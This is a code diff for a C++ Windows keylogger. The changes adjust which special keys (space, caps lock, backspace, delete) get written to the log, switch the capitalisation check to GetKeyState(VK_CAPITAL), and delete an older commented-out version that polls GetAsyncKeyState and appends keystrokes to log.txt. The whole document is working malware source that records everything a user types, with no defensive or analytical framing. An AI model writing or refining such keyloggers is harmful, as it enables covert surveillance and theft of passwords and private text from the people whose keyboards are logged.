@@ -28,12 +28,21 @@ bool specialKeys(int sKey)
     {
     //https://msdn.microsoft.com/en-us/library/ms927178.aspx
 
-
+/*
     case VK_SPACE:
         //cout << " " << endl;
         writeSpecialLog(" ");
         return true;
+        break;*/
+        //no need
+/*
+    case VK_CAPITAL:
+        //cout << "CAPITAL" << endl;
+        writeSpecialLog("#<CAPITAL>#");
+        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
+        return true;
         break;
+*/
 
     case VK_RETURN:
         //cout << "\n" << endl;
@@ -54,17 +63,18 @@ bool specialKeys(int sKey)
         break;
 
     case VK_DELETE:
-        //cout << "TAB" << endl;
+        //cout << "DEL" << endl;
         writeSpecialLog("#<Del>#");
         return true;
         break;
 
+/*
     case VK_BACK:
         //cout << "TAB" << endl;
         //NO NEED TO MAKE \t LUL
-        writeSpecialLog("#<BACKSPACE>#");
+        //writeSpecialLog("\b");
         return true;
-        break;
+        break;*/
 
     default:
         return false;
@@ -94,8 +104,8 @@ int main()
 
                     if (keyloggerSaveFile.is_open())
                     {
-                        if((key>64)&&(key<91)&&!(GetAsyncKeyState(0x10)))
-                            //GetAsyncKeyState(0x10) MEAN IF THE LOCK KEY IS DOWN
+                        if((key>64)&&(key<91)&&!(GetKeyState(VK_CAPITAL)))
+                            //GetKeyState(VK_CAPITAL) MEAN IF THE LOCK KEY IS ACTIVE
                         {
                             key+=32;
                             keyloggerSaveFile << char(key);//CHAR(27) FOR EXEMPLE IS ESCAPE
@@ -117,41 +127,3 @@ int main()
 
     return 0;
 }
-/*#include <iostream>
-#include <windows.h>
-
-using namespace std;
-
-int Save(char _key, char *file);
-
-int main()
-{
-    char i;
-
-    while (true)
-    {
-        for (i = 8; i <= 255; i++)
-        {
-            if (GetAsyncKeyState(i) == -32,767)//si on appuie sure rien
-                Save(i, "log.txt");
-        }
-    }
-
-    return 0;
-}
-
-int Save(char _key, char *file)
-{
-    cout << _key << endl;
-
-    FILE *OUTPUT_FILE;
-
-    OUTPUT_FILE = fopen(file, "a+");
-
-    switch()
-    case
-    fprintf(OUTPUT_FILE, "%s", &_key);
-    fclose(OUTPUT_FILE);
-
-    return 0 ;
-}*/
